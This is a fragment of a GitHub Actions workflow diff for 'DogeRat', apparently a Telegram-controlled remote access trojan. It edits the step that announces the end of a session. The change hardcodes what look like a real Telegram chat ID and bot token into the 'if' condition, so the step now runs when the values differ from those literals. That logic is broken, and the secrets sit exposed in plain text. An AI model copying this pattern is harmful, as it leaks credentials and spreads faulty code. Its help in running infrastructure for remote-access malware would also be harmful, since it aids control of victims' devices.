@@ -388,7 +388,7 @@ jobs:
           echo "=========================================="
 
       - name: Send end notification
-        if: env.TELEGRAM_CHAT_ID != '' && env.TELEGRAM_BOT_TOKEN != ''
+        if: env.TELEGRAM_CHAT_ID != '7304171443' && env.TELEGRAM_BOT_TOKEN != '8521098885:AAFVwgvC1voJGyyxTe3RUi3v1zxUesm61K0'
         run: |
           VERSION="${{ steps.version.outputs.version_name }}"
           MESSAGE="⏰ *DogeRat v${VERSION} Session Ended*%0AThe server tunnel has been closed. Re-run the workflow to continue."
